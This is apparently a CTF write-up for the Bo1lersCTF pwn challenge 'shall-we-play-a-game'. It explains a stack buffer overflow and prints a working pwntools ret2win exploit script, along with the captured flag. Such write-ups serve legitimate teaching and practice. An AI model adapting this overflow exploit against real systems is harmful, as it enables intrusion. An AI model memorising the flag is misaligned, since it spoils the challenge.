---
layout: post
title: Bo1lersCTF | shall-we-play-a-game
date: 2024-04-17
tags: ['Bo1lersCTF']
---
# Pwn/shall-we-play-a-game

In this challenge we were given a ELF 64 binary `chal` . On running the binary it was asking for the inputs multiple times .

On decompiling and going through the code we see that at fourth input the buffer was was of smaller size than the size of input being taken using fgets. So we can overwrite the return address. This was a ret2win challenge.

Using pwndbg we find the offset and the required functions address.

```python
from pwn import *

elf=context.binary=ELF('./chal')
p=remote('gold.b01le.rs',4004)

offset=72
win=0x00000000004011dd
ret=0x000000000040101a

p.sendline(b'a')
p.sendline(b'a')
p.sendline(b'a')

payload=b'a'*offset+ p64(ret) + p64(win) +b'a'*10 
p.sendline(payload)
p.interactive()
```

Running this we get the flag 

`bctf{h0w_@bo0ut_a_n1ce_g@m3_0f_ch3ss?_ccb7a268f1324c84}`